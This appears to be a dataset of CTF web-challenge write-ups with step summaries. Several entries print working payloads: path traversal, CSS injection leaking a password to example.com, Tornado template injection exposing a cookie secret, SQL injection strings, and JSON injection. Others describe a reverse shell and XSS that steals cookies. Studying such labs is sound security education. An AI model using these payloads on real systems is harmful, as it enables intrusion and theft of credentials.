In the `a.cpp` file, it says `system(""cat flag.txt"")`, indicating that the flag is present in the same directory in the `flag.txt`. We can pass in an array which passes the first 2 checks. Then it has to check if the `.slice(file.indexOf('.') + 1)`, so the last 2 elements have to be `['.', 'js']`. So, we can try passing `['flag.txt', '.', 'js']`, which makes the path `/home/user/flag.txt,.,js`, which is invalid. However, we can make use of the `path.resolve()`, and the fact that only the first 5 elements are used. If the array becomes `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` (`js` because `txt` is not allowed). So, this passed the file check, because `.slice()` returns `['js']` and `['js'] == 'js'` is true (not used `===`). Now, to get rid of this, we add 4 random elements before the element having `flag.txt`.

Now, the string upon concatenation will give `${pwd}/a,b,c,d,/../flag.txt` (now you see why we added `/../`), so that it resolves to `${pwd}/flag.txt` because of `flag.txt`. The payload, therefore, is:
`/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js`

And you can get the flag.
","Analyze the JavaScript code of the Express app and understand the restrictions on the `file` parameter.
Inspect the `a.cpp` file and notice the `system(""cat flag.txt"")` command, indicating the presence of `flag.txt` in the same directory.
Craft a payload to bypass the restrictions and use `path.resolve()` to access `flag.txt`. Payload: `/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js`
Send the payload to retrieve the flag.
"
"Description: ""People who get violent get that way because they can't communicate.""

When you google the challenge description, you find out that the quote is from Mr. Robot. This indicates that the user might want to check out the `robots.txt` for the website.

When you open the website, it serves the `index.html` file, which has content written about `Brobot`, again trying to put across `robots.txt`.

When you visit `robots.txt` and visit the disallowed route, you get the flag!
","Google the challenge description and discover the quote is from Mr. Robot, hinting at checking `robots.txt`.
Open the website and notice the content mentioning `Brobot`, again suggesting to look into `robots.txt`.
Visit `robots.txt` and find the disallowed route.
Access the disallowed route to obtain the flag.
"
"Description: ""My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.""

You just need to change the cookie value to the base64 value of ""chocolate"".
And you get the flag.
","Change the cookie value to the base64 value of ""chocolate"".
Obtain the flag.
"
"Description: ""This is a super secure portal with a really unusual HTML file. Try to login.""

You need to view the page source.
On seeing it, you will realize that this script has been obsfucated, and is checking for the password for this portal. The list `var _0x575c` has been encoded to hex, which translates to this: `var _0x575c = [""2-4"", ""substring"", ""4-7"", ""getItem"", ""deleteItem"", ""12-14"", ""0-2"", ""setItem"", ""9-12"", ""^7M"", ""updateItem"", ""bb="", ""7-9"", ""14-16"", ""localStorage""];`

Now, in the function `CheckPassword`, you see the word `window` being repeated many times. For an example, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]` is actually `window.localStorage.setItem` and so on.

The password has been split to many parts.
We have each part of the password stored to an assigned key.
Similarly, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]` is `window.localStorage.getItem`. We use this command to check the splitted password with our input password.
","View the page source.
Identify the obfuscated JavaScript code and translate the hex-encoded list.
Understand the function `CheckPassword` and identify parts of the password.
Combine the password parts to obtain the complete password.
"
"Description: ""Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.""

This is a CSS injection challenge (of course you can do `<<script >>` but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type=""password""][value^=""c""] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.

You may pass a long list of such CSS selectors, for all letters.

This will therefore tell you which character matched, which you can see on your own server (here example.com). Once the first character is leaked, you can go ahead and try to leak the next character.

An so on, until you find the entire password. You can test this on your browser by storing a cookie called `password` with the value `csictf`. Now pass the following to get a request on your server (replace example.com with your server).

Pass these payloads to `/admin` and you can leak the admin cookie `password`, which is the flag.

Using this method, you can progressively leak the entire password and obtain the flag.
","Recognize the challenge as a CSS injection challenge.
Create a series of CSS selectors to leak the characters of the hidden `password` field.
Set up a server to receive the leaked characters (e.g., example.com).
Inject the CSS selectors into the input box and submit the form.
Monitor the server to collect the leaked characters and progressively reconstruct the password.
Obtain the flag by leaking the admin cookie `password`.
"
"Description ""You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?
(I love you 8000.)""

This challenge involves exploiting the server script through Tornado template injection to obtain the cookie secret and forging a signed cookie to access the flag.

- The server script runs on `http://chall.csivit.com:30279/`. Input is taken as the ""icecream"" value. 
 
- A secure cookie is being set and compared to print a flag value. In tornado, signed cookies contain the encoded value of the cookie
  alongwith a timestamp and an HMAC signature. Such cookies are supported by the set_secure_cookie and get_secure_cookie methods which require a specific secret key: cookie_secret.

- Upon visiting `http://chall.csivit.com:30279/?icecream={{globals()}}`, you see something useful:
`'application': <tornado.web.Application object at 0x7f2976579750>`

- You now know that the name of the variable `tornado.web.Application(...)` is `application`.

- Run the server script with the exploit payload `http://chall.csivit.com:30279/?icecream={{application.settings[""cookie_secret""]}}` to get the cookie_secret value `MangoDB` displayed on the website.
  
- Replace the value of the secure cookie `admin` to the required comparison value `true` to obtain a signed cookie on the browser. Now, replace the signed cookie generated upon running the server script with the one obtained after the secure cookie value was set to `true`. This results in a cookie which looks like the following. Note `dHJ1ZQ==` is base64 for `true`.
""2|1:0|10:1594808471|5:admin|8:dHJ1ZQ==|5da7d1e446451e825e42001e7f07360e2e2e77c9c68b14fca1a517259712cdac""

- Upon reloading the server script, the text on the website would change from `Unfortunately, you aren't worthy` to the flag value.
","Visit the server script at `http://chall.csivit.com:30279/`.
Exploit Tornado template injection with `http://chall.csivit.com:30279/?icecream={{globals()}}` to find the `application` variable.
Use the payload `http://chall.csivit.com:30279/?icecream={{application.settings[""cookie_secret""]}}` to obtain the `cookie_secret` value `MangoDB`.
Set the secure cookie `admin` to `true` and generate a signed cookie in the browser.
Replace the signed cookie generated upon running the server script with the one obtained after setting the secure cookie value to true.
Reload the server script to see the flag value on the website.
"
"In this challenge, you can see the `index.php` code by default.

So, you see that we have to match the value of `hash` and `target`. It is checked that the `hash` param does not equal `10932435112`, but again it checks that the sha1 hash of `hash` is equal to that of `10932435112`. We know that the sha1 hashes will not match ever, so it's not a bruteforce challenge. Later, you notice that the `$hash` and the `$target` and matched using `==` and not `====`. `==` is vulnerable to type juggling!

If you see the hash of `10932435112`, it starts with `0e...`. So any other hash which starts with `0e` will match this with `==`, since `==` does not check types, so these will be treated as numbers. So, you have to bruteforce considerably lesser amount of values. 

You would find a lot of matches.

Pass any of these with the GET param `hash`, and you get the flag.
","Observe that the `index.php` code checks that the `hash` parameter does not equal `10932435112`, and the sha1 hash of `hash` equals that of `10932435112`.
Notice that `$hash` and `$target` are compared using `==`, which is vulnerable to type juggling.
Find a hash starting with `0e` that matches the sha1 hash of `10932435112` using `==`.
Pass one of these matching values with the GET parameter `hash` to obtain the flag.
"
"When you look at the documentation for the source for the `flask_caching` module, you can optionally store a python pickle in the redis by prepending it with `'!'`. You can use python pickles for RCE, when the caching modules uses `pickle.load()` to load the cached data.

Set up a netcat listener on your server and run the following script with your IP and PORT.
[Python script: Create a payload for RCE and send it to the server]

On your netcat listener, you would get the flag.
[HTTP POST request with the flag]
","Analyzed `flask_caching` module documentation and found the option to store python pickle in redis with '!' prefix.
Recognized that python pickles can be used for RCE when `pickle.load()` is used to load cached data.
Set up a netcat listener on the server.
Ran the provided Python script with server IP and PORT to create and send RCE payload.
Received the flag on the netcat listener through an HTTP POST request.
"
"The critical line in the code is:
[Python code: Use subprocess.Popen to call FFmpeg]

Here, you can perform Remote Code Execution (RCE) with the file name. The idea is to grep the flag from the main.py file and write it on the image to which the GIF is going to be converted. This can be done with the -vf drawtext=... option. The payload used is:
[Payload: Include grep and drawtext options in the file name]

When you upload a GIF with this payload as the file name, you will receive a resulting PNG with the flag written on it.
","Identified critical line in code using subprocess.Popen to call FFmpeg.
Recognized potential for Remote Code Execution (RCE) with file name.
Crafted a payload using -vf drawtext=... option to grep the flag and write it on the output image.
Uploaded a GIF with the payload as the file name.
Received a resulting PNG with the flag written on it.
"
"In this challenge, you see a bunch of captcha's floating around on your screen, and the goal is to successfully get 5 captchas. There's many ways to solve this, here's what was done:

When you see the source, this is the function which creates the captchas and makes them move:
[JavaScript code: Captcha creation and movement function]

To make it easier to solve the captchas, modify this function using your browser's developer tools, removing the part where it runs the loop, which is responsible for moving the captchas.
[Modified JavaScript code: Captcha creation function without movement]

Now, you can manually add 5 captchas and get them. Just call the function `addCaptcha()` and keep clicking the boxes. When you're done with 5, click on `GET FLAG`, and copy the flag from the screen!
","Analyzed source code and found the JavaScript function responsible for captcha creation and movement.
Modified the function using browser's developer tools to remove the movement loop.
Manually called `addCaptcha()` function to add 5 captchas without movement.
Clicked on the boxes to solve the captchas.
Clicked on `GET FLAG` and copied the flag from the screen.
"
"The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. The flag is right in front of you.""

Upon opening the link, an image is displayed, which hints at Sweden. So, the solution involves setting the language headers to Swedish using a ""curl"" command.
[Shell command: Set Accept-Language header to Swedish]

Executing this command returns the flag.
","Received challenge text hinting at using a ""curl"" command and a connection to Sweden.
Set the Accept-Language header to Swedish using the curl command provided.
Executed the command and obtained the flag.
"
"The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. Why do logos make things so recognizable?""

Upon opening the link, an image is displayed that shows the logos of Xbox and Linux. This is viewed on a Windows device.

To change the User-Agent to Linux, use the following command:
[Shell command: Set User-Agent header to Linux]

Executing this command returns a response with the Linux logo gone.

Next, set the User-Agent to both Linux and Xbox:
[Shell command: Set User-Agent header to Linux Xbox]

Executing this command gives the flag inside the body of the page.
","Received challenge text hinting at changing User-Agent and the presence of logos.
Opened the provided link, displaying Xbox and Linux logos on a Windows device.
Changed the User-Agent to Linux using the provided shell command, removing the Linux logo from the response.
Set the User-Agent to both Linux and Xbox using another shell command.
Executed the command and found the flag inside the page body.
"
"The challenge provides the following hint: ""Normal fries are nice, but everything's better with a curl in it. I'm with you, every step of the way.""

Upon opening the link, an image is displayed. To solve the challenge, a series of curl commands were executed with various headers, cookies, and JSON data. Here's the process:

Change the method to POST and send a request to the URL.

Set the Referer header to Google and send a request to the URL. In response, you receive a hint to attend a dinner party hosted by dscvit.

Set the Host header to dscvit.com and send a request to the URL. The response mentions potatoes, carrots, milk, and cookies.

Set the user cookie to ""root"" and send a request to the URL, as potatoes and carrots are root vegetables. The response contains a JSON-related hint.

Set the Content-Type header to application/json, include JSON data, and send a request to the URL. The response points out that ""messi"" is required in the JSON data.

Add ""messi"" to the JSON data and send a request to the URL. The response asks for the club Messi is in.
Change the ""messi"" value to ""psg"" and send a request to the URL, since Messi is playing for PSG at the time.

After executing the final command, the flag is returned.","Changed the method to POST and sent a request to the URL.
Set the Referer header to Google and received a hint about attending a dinner party.
Set the Host header to dscvit.com and received a response mentioning various ingredients.
Set the user cookie to ""root"" and received a JSON-related hint.
Set the Content-Type header to application/json, included JSON data, and received a hint about needing ""messi"".
Added ""messi"" to the JSON data and received a response asking for Messi's club.
Changed the ""messi"" value to ""psg"" and sent a request to the URL.
Obtained the flag in the response.
"
"This Python script demonstrates an SQL Injection attack against the web application's database to solve the ""Taxi Union"" and ""Gate Keeper"" challenges. The script performs the following steps:
[Import the necessary libraries and initialize the variables.
Set the appropriate URL, check string, key, and column values based on the selected challenge (either ""Taxi Union"" or ""Gate Keeper"").
Iterate through each character in the domain (letters, digits, and special characters) while searching for the flag.
For each character, create an SQL injection payload that checks if the current flag value concatenated with the character is a prefix of the targeted column's value.
Send an HTTP POST request to the URL with the payload as the form data.
If the check string is found in the response, it means the character is part of the flag. Add the character to the flag and continue iterating through the domain.
Repeat the process until the entire flag is discovered.]

The Python script helps to find the flag by exploiting SQL injection vulnerability in the web application.
","Import necessary libraries and initialize variables.
Set URL, check string, key, and column values for the chosen challenge (""Taxi Union"" or ""Gate Keeper"").
Iterate through each character in the domain while searching for the flag.
Create an SQL injection payload for each character, checking if it's a prefix of the targeted column's value.
Send an HTTP POST request with the payload as form data.
If the check string is found in the response, add the character to the flag and continue iterating.
Repeat the process until the entire flag is discovered using the Python script's SQL injection exploit.
"
"The challenge begins with the given text: ""There is nothing here I promise! ;)""

Upon opening the link, an image is displayed. By checking the network tab, a response header with a specific string is found. A curl request is then sent, setting the cookie to the given string.

The response contains another string. A new curl request is sent with this new string as the cookie.

To automate this process, a Python script is written:
[Define the initial URL and the first flag value.
Create a loop that continues until the final flag value, 'EOF', is found.
In each iteration, send an HTTP GET request to the URL with the current flag value as a cookie.
Append the received string to the list of flags and continue iterating.
Once the loop is finished, print the received strings.]

The output contains multiple strings, which appear to be MD5 hashes. After decoding these hashes, a sequence of characters is obtained, which is the flag.
","Opened the provided link and found a response header with a specific string.
Sent a curl request setting the cookie to the given string and received another string in response.
Sent a new curl request with the new string as the cookie.
Wrote a Python script to automate the process, iteratively sending HTTP GET requests with flag values as cookies.
Obtained multiple strings from the output, which were MD5 hashes.
Decoded the MD5 hashes to reveal a sequence of characters, which is the flag.
"
"This solution demonstrates a SQL Injection attack to solve a CTF challenge. The script also works for the `Gate Keeper` challenge. Here's a high-level explanation of the Python script:
[Import the necessary libraries: `requests` and `string`.
Initialize an empty `flag` variable, and define the search domain containing all possible characters.
Set the challenge, URL, check, key, and column variables based on the challenge being solved (either ""taxi union"" or ""gate keeper"").
Enter an infinite loop that iterates through each character in the search domain.
For each character, create a payload containing a SQL injection query using the current flag and character.
Send an HTTP POST request to the URL with the payload as the data.
Check if the expected response text is found in the received response.
If the expected response is found, add the character to the flag and print it.
Break the loop once the flag is found.]

The script automates the process of testing various payloads to exploit the SQL Injection vulnerability and retrieve the flag.
","Import necessary libraries (`requests` and `string`) and initialize an empty flag variable.
Define the search domain containing all possible characters and set challenge-specific variables.
Enter an infinite loop iterating through each character in the search domain.
Create a payload containing a SQL injection query using the current flag and character.
Send an HTTP POST request to the URL with the payload as the data.
Check if the expected response text is found in the received response.
If the expected response is found, add the character to the flag and print it.
Break the loop once the flag is found, exploiting the SQL Injection vulnerability.
"
"When you examine the source code, you'll notice the application uses `bodyParser.urlencoded` with `extended: true`. This allows arrays and objects to be passed in the request body. In the `/login` POST route, the output has not been stringified, so it is possible to pass an object in the query statement.
[JavaScript code: Configure bodyParser and create SQL query]

The exploit is to pass an object as the password parameter, with a known attribute. This causes the SQL query to be evaluated in a way that allows logging in without knowing the correct password. We'll refer to the official `mysql` docs for more information on how objects are converted into comma-separated attributes in SQL queries.

The final payload for this exploit is:
[HTTP POST request: Send payload with object as password]

From here, you can just take the cookie you received, and use that to visit `/flag`. Alternatively, you can use a Python script to automate the process:
[Python script: Send payload, get the flag, and print it]

You can run this script and use `grep` to find the flag.
","Examine the source code and identify the use of `bodyParser.urlencoded` with `extended: true`.
Notice that the output has not been stringified, allowing objects to be passed in the query statement.
Create an exploit by passing an object as the password parameter, causing the SQL query to be evaluated in a way that allows logging in without knowing the correct password.
Consult the official `mysql` docs for more information on object conversion in SQL queries.
Construct the final payload and send it as an HTTP POST request.
Use the received cookie to visit `/flag` or automate the process with a Python script.
Run the script and use `grep` to find the flag.
"
"When you visit the website, you find that there's a cookie containing a JWT. It's hashed using `HS256`. The JWT secret was brute-forced using `rockyou.txt` and John The Ripper, which revealed the secret as `supersecret`. Using this secret, a JWT with `username: admin` was created and added to the cookie, logging in as admin.

Visiting a random route starting with `/admin/` that throws a 404 error, it was observed that there's scope for template injection in the 404 page. By climbing up the Python MRO using `__class__` and `__bases__`, etc., a list of all available classes was found. At index 405, the `subprocess.Popen` class was discovered.

Using this class, a reverse shell was spawned by sending a specially crafted URL. A netcat listener was started on the server at the specified port, which ultimately led to gaining a shell.

Upon listing the files and reading the content of `flag.txt`.
","Visited website and found JWT hashed with HS256 in a cookie.
Brute-forced JWT secret using rockyou.txt and John The Ripper, revealing secret as 'supersecret'.
Created a JWT with 'username: admin' and added it to the cookie to log in as admin.
Found template injection vulnerability in the 404 page of an /admin/ route.
Explored Python MRO and discovered the subprocess.Popen class.
Spawned a reverse shell using a crafted URL and netcat listener.
Gained shell access and read the content of 'flag.txt'.
"
"The challenge is very simple once you know what to do.
This is the hint:
""We will only give our flag to our Agent 95! He is still running an old version of Windows...""

We assume Agent 95 uses Windows 95. So just change the `User-Agent` header to `Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)`.

We use a Python script:
[Python code: using `requests` to send a GET with the `User-Agent` header]

In the response, you got the flag.
","Understand the hint and assume Agent 95 uses Windows 95.
Change the `User-Agent` header to `Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)`.
Use a Python script with the `requests` library to send a GET request with the modified `User-Agent` header.
Receive the response containing the flag.
"
"Well, if you happen to look at the local storage, you'll get the flag directly. But that's not how we got it because we're stupid. So, here's what we did.

You see a JS file in the sources: `jquery.jscroll2.js`. Now, to understand what exactly it does, we first convert the huge list on `line 1` from `hex` to `string` to be able to make sense of it. So let's convert it using a script written in `python2`.

Once you convert it, you will see some meaningful strings such as `localStorage`, `setItem`, `data`, `defaults`, `extend`, `function`, etc..
Now we can try to make sense of the rest of the code.

We see an interesting line. Now that we have the strings figured out:
[JavaScript code: stores the decoded base64 string in local storage with the key 'flag']

So the script basically converst the `base64` string `SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9` and stores it in local storage with the key `flag`. Well, now you can just check the local storage, or just convert this string to ASCII using BASH.
","Examine the local storage to find the flag directly (alternative solution).
Find and analyze the `jquery.jscroll2.js` file in the sources.
Convert the hex list on line 1 to a string using a Python script.
Understand the decoded JavaScript code and identify the line that stores the decoded base64 string in the local storage with the key 'flag'.
Check the local storage or convert the base64 string to ASCII using BASH to get the flag.
"
"Press `Ctrl + U` on your browser to view the source code of the `HTML` file. Search for `flag{...}`. 
[HTML source code with flag]
","Press `Ctrl + U` to view the source code of the HTML file.
Search for `flag{...}` in the source code.
"
"This is a beginner SQL Injection challenge. To retrieve the flag, you need to inject a malicious SQL query into the login form.

Simply pass the username and the password as ' or 1=1 -- , which will be interpreted as a SQL query that always returns true, and comment out the rest of the query with the -- symbol. This will cause the server to execute the SQL query as if you had provided valid login credentials, resulting in an alert box displaying the flag.
","Recognize the challenge as a beginner SQL Injection.
Inject a malicious SQL query into the login form using the username and password as ' or 1=1 -- .
The server executes the SQL query as if valid login credentials were provided.
An alert box displays the flag.
"
"[This challenge involves exploiting a vulnerability in the `generateToken` function in a JavaScript file. The function generates a token for a given `username`, where the `username` is included as a string in a JSON object that is encrypted using `aes-192-cbc`. However, the function forms the JSON object in a way that allows the "" character to be closed with the help of the string passed in the `username` parameter, and sets the `member` field to a non-zero value.]

You really just need to notice this function. Notice, the token is not created like `token.username = username`. It's formed in the following way:
```
const token = `{""integrity"":""${INTEGRITY}"",""member"":0,""username"":""${username}""}`
```

To exploit the vulnerability, we can pass the `username` as `"",""member"":""1` which will close the `""` character and set `member` to `1`. Then, we can visit `/api/flag` to get the flag in JSON format.
","Identify the vulnerability in the `generateToken` function, which creates a token in an exploitable manner.
Pass the `username` as `"",""member"":""1`, closing the `""` character and setting `member` to `1`.
Visit `/api/flag` to get the flag in JSON format.
"
"This challenge uses XSS to get the flag from the `admin bot's` cookies.

First, try a random `<h1>Hello</h1>` tag to see if you can put HTML in your pastebin.

Inspecting the `js` file of the page we can can infer 2 things:
- the content of the page is obtained from the URL, which is a base64 encoded form of the text you entered.
- the `clean` function will not allow writing of text if bracket pairs do not match.

It is rather easy to break this `clean` function, by adding an extra `>` at the starting of your XSS script. Here's the payload:
[Payload for XSS attack with an extra "">"" at the beginning of the script]

Your payload has the following URL:
[URL with base64 encoded payload]

You can simply set up a `netcat listener` using `nc -l port` on your server, and pass the link to the `Admin Bot`. The admin bot is basically a headless chrome browser which has the flag in it's cookies. When it visits your site, the XSS steals the cookies from the admin bot and sends it to your server. You get a request which looks like:
[HTTP GET request with the flag in the cookie]
","Test if HTML tags can be inserted by trying a random `<h1>Hello</h1>` tag.
Inspect the JavaScript file to understand the content retrieval and `clean` function.
Create an XSS payload with an extra `>` at the beginning to bypass the `clean` function.
Encode the payload in base64 and create a URL with the encoded payload.
Set up a `netcat listener` on your server using `nc -l port`.
Pass the link to the `Admin Bot`, which will trigger the XSS attack.
Receive an HTTP GET request on your server containing the flag in the cookie.
"
"This site allows you to write HTML, so it's basically shouting at you to perform an XSS attack. The URL of the webpage created actually consists a base64 encoded form of the content of the page. We can see the `js` in the source.

The main thing we notice is that it prevents `script` tags and it allows only the following attributes for an element: `'src', 'width', 'height', 'alt', 'class'`. So we have to perform an XSS with these attributes. So, here's the payload:
[Payload for XSS attack using an iframe and the 'src' attribute]

Note that here, the site is supposed to be `https`, otherwise there will be a Content Security Policy Bypass (CSP Bypass) error, and the request won't be sent. We can get the URL of the resulting webpage:
[URL with base64 encoded payload]

On the server, we can create a simple Node.js backend which accepts the cookie as a query param and logs it. Here's an example of the backend code:
[Node.js code for a simple backend to log the stolen cookie]

When the link for the website is sent to the `admin bot`, which is basically a headless chrome browser, it visits the page and it's cookie is stolen and sent to the server at `myserver.tld`. The cookie stores the `flag`.
","Notice that the site allows HTML and prevents `script` tags, allowing only specific attributes.
Create an XSS payload using an iframe and the 'src' attribute.
Encode the payload in base64 and create a URL with the encoded payload.
Ensure the site uses `https` to avoid Content Security Policy Bypass (CSP Bypass) errors.
Create a Node.js backend to accept the stolen cookie as a query param and log it.
Send the link to the `admin bot`, which visits the page and has its cookie stolen.
Retrieve the flag stored in the stolen cookie on your server.
"
"The first part of the challenge is a sort of vague guesswork. In the challenge description, there are two words - `page` and `upload` - which the author wants you to notice. Also, when you view the homepage source, it has a comment `<!-- get the 'page' :eyes: -->`. 

So, the first try was to pass a query `page` in the flag. So, we tried to visit `?page=flag`. Here, we get a gif.

Now, since the description had the word `upload` in it, we tried to checkout if there is a page called upload, and there was!

Here, we can assume that we have to do some sort of local file inclusion. So we created a file called `payload.php`, and tried to `ls` the directory. We saw a lot of files called `flag`, so we just decided to print all files and just search on the browser.

Here's the final payload for the PHP code:
[PHP code payload for local file inclusion to find all files and print them]

Now you can visit the route `/?page=payload` (name of the file you uploaded). This gives a page with a lot of stuff.

So, the contents of all the files are now on the browser. All you have to do is open the source code and search for the flag format.
","Notice the words `page` and `upload` in the challenge description and the comment in the homepage source code.
Visit `?page=flag` and find a gif.
Check if there's a page called `upload`.
Assume the challenge involves local file inclusion.
Create a `payload.php` file to list and print all files in the directory.
Upload the payload and visit the route `/?page=payload`.
View the contents of all the files in the browser.
Open the source code and search for the flag format.
"
"Description: ""BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!""

After start of the instance picoCTF will provide you source code of the site and link to running instance.

The site has a login screen and a main screen with books. We can't access any of them except the first one. Let's dive into the code.

There are some files, that are interesting to us. Inside `JwtService.java` we can see all data, that JwtToken contain, the issuer and that `secretGenerator` gives the secret key.
In `SecretGenerator.Java`, we found out that ""secret key"" is `1234`. We have all the information to encode and decode JWT tokens.

We need a userId, so let's go back to the login screen. Using Google Chrome, press F12, open `Network` tab and login with creds from picoCTF: user:`user`, pass:`user`.
We can get the JWT token for our user in the payload of the response. Copy it and go to `jwt.io` to decode it, revealing the `userId` as `1`.

Now let's encode our JWT token with role `Admin`. In the `controllers` directory, we can find `UserController.java`, which has an endpoint for updating user roles. We will use Postman to send some requests with the new JWT to update our role and read the flag.

First, we need to create a new user on the site because we can't patch the default user role. Next, we need to obtain the users list. Put the token into headers and send a request. Our id is `6`. Now let's patch our role.

Now that we are an `Admin`, just log in and read the flag.
","Analyze the provided source code and discover that the secret key is `1234`.
Log in with given credentials (user:""user"", pass:""user"") and capture the JWT token from the payload.
Decode the JWT token using `jwt.io` to find the `userId` as `1`.
Encode a new JWT token with the role `Admin`.
Use Postman to send requests with the new JWT token to update the user role and read the flag.
Create a new user on the site as the default user role cannot be patched.
Obtain the users list, find the new user's id (e.g., `6`), and patch the user's role to `Admin`.
Log in as an `Admin` and read the flag.
"
"Description: ""Can you find the flag on this website.""

Additional details will be available after launching your challenge instance.
 
After start of the instance picoCTF will provide you a link to running instance.

If you type `user` as the username and `user` as the password, you will get a message that reveals the query for the login request. Since we know the query, we can easily get in by entering `'or 1=1;--` in the `pass` field. This modifies the query to be something like:
[SQL query modified with 'or 1=1;--' for bypassing authentication]

We can test some queries to find out what database is used. By entering this query: `123' UNION SELECT 1, sqlite_version(), 3;--`, we now know that the site is using SQLite.

Now we can list all tables with this query: `123' UNION SELECT name, sql, null from sqlite_master;--`. We find the flag in the table named `more_table`.

To get the flag, we use this query:
[SQL query to retrieve flag from the 'more_table']
","Log in with the provided username and password (`user` and `user`) to reveal the query for the login request.
Bypass authentication by entering `'or 1=1;--` in the pass field, which modifies the query.
Identify the database used by entering the query `123' UNION SELECT 1, sqlite_version(), 3;--`, revealing it as SQLite.
List all tables with the query `123' UNION SELECT name, sql, null from sqlite_master;--`, finding the flag in the `more_table`.
Retrieve the flag by using the SQL query targeting the `more_table`.
"
"Description: ""The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?""

Additional details will be available after launching your challenge instance. 

After start of the instance picoCTF will provide you a link to running instance.

There is a site.

We saw tag `XXE` -> `XML external entity` and also, when we inspect static resources (F12 -> Sources in Google Chrome) of the site, we saw this two files:
- detailsCheck.js
- xmlDetailsCheckPayload.js

So, now we know for sure, that it is XXE. 

Also in the index.html we saw the endpoint for the POST request:

We need just to make POST request to the `<url_of_site>/data` with XML payload to get the flag.

Let's check the format for XML request. Just click button on the site and look the request format in `Network` tab.

Now just send `POST` request with our payload and obtain the flag.","Identify the XXE (XML external entity) vulnerability by inspecting static resources (F12 -> Sources in Google Chrome), finding `detailsCheck.js` and `xmlDetailsCheckPayload.js`.
Locate the endpoint for the POST request in the `index.html` file.
Determine the format for the XML request by clicking the button on the site and observing the request format in the `Network` tab.
Send a POST request with the XML payload to `<url_of_site>/data` to obtain the flag.
"
"The web application allows you to create a meme specifying the URL of an image, the top text and the bottom text. The image can be exported in PDF format clicking on the ""Export!"" button.

Clicking on the button, a POST request is created.

Creating a listener, you can discover that two requests are performed to retrieve the image.

PhantomJS/2.1.1* is vulnerable to *CVE-2019-17221* and it is a deprecated package.

After some analysis, you can discover that top and bottom texts parse the HTML, interpreting it.

So it is sufficient to craft a payload like the following for one of the two texts.

[HTML script that performs an XMLHttpRequest to fetch the contents of the file ""/etc/flag.txt"" and writes it to the document. This could be an example of a cross-site scripting (XSS) attack or an attempt to access sensitive information.]

Putting the payload in a POST request.

A pdf with the flag will be returned.","Explore the web application and find it allows you to create memes with an image URL, top text, and bottom text.

Discover that a POST request is created when clicking the ""Export!"" button.

Set up a listener to observe that two requests are performed to retrieve the image.

Identify that PhantomJS/2.1.1 is vulnerable to CVE-2019-17221 and is a deprecated package.

Determine that top and bottom texts parse the HTML, interpreting it.

Craft a payload for one of the texts, which can be an example of a cross-site scripting (XSS) attack or an attempt to access sensitive information.

Insert the payload in a POST request.

Receive a PDF with the flag as a result.
"
"The website contains a login form with two different authentications, user credentials and guest account, managed by a the script auth.js.

Analyzing the JavaScript, you can discover that a query to a GraphQL endpoint is performed with the standard authentication. Credentials are put into cookies.

Guest credentials, decoded from base64, are the following.

Connecting as guest, you can reach the dashboard listing all the data and discover main.js which contacts the GraphQL backend to retrieve data.

Queries discovered till now are the following:
mutation { login(username:""username"", password:""password"")};
query Query { Challs { id title description category author points }}.

You can enumerate types and dump the database schema.

With graphql-voyager you can easily view the schema structure.

The ID of the challenge that should have the flag is `35`. You can try to retrieve the flag, but you will discover that you are not authorized.

There is a query, `allUsers`, that can be used to retrieve users data.

So you can craft the authentication cookie for the administrator.

And then retrieve the data for the challenge with a POST request.

You can read hint data too.

You can dump all challenges data, but there is no flag at all.

With the following payload, you can discover a SQL error.

So you can craft a SQL injection payload discovering the flag.","Analyze the website with a login form and identify the auth.js script managing user credentials and guest account.

Examine the JavaScript and find a query to a GraphQL endpoint with standard authentication, using cookies for credentials.

Decode guest credentials from base64 and connect as a guest to access the dashboard.

Discover the main.js script and GraphQL queries for authentication and challenges data.

Enumerate types and dump the database schema, then visualize the schema structure with graphql-voyager.

Identify the ID of the challenge containing the flag and attempt to retrieve it, only to find you're not authorized.

Use the `allUsers` query to obtain user data and craft an authentication cookie for the administrator.

Retrieve the challenge data and hints with a POST request.

Dump all challenges data and discover a SQL error using a crafted payload.

Create a SQL injection payload to retrieve the flag.
"
"The SSTI in the URL is a hint to Server-Side Template Injection vulnerabilities.

[A URL that includes a server-side template injection vulnerability, where the ""url"" parameter is being passed an expression that will be evaluated by the server as part of a string. The expression in this case is ""7*7"", which will be evaluated to ""49"" and included in the resulting URL.] will return a 404 Not Found error.

[A URL that includes a server-side template injection vulnerability, where the ""url"" parameter is being passed an expression that will be evaluated by the server as part of a string. The expression in this case is void] will return a strange message.

The same happens for chars: `%`, `[`, `]`, `""`, `+`, `_` and for words: `self`, `request`, `join`, `config`.

So the template engine is probably Jinja2, but you have to face some restrictions.

The following payload will return all subclasses.

[Python code that retrieves all the subclasses of the built-in object class using a series of method calls and function invocations.]

So we have the list of returned subclasses.

The following payload will return the output of the `id` command.

[Python code that appears to be attempting to execute a shell command with root privileges. This is a potentially dangerous operation and should be approached with caution.]

[HTML code displaying an error message with centered text stating that the requested resource with the identifier ""b'uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)'"" could not be found (error code 404). The text appears within an H1 heading element.]

So you can execute remote commands, listing the directory content and printing the flag.","Identify the Server-Side Template Injection vulnerability in the URL.

Test various URL expressions, noting that certain characters and words return strange messages or 404 errors.

Determine that the template engine is likely Jinja2 with some restrictions.

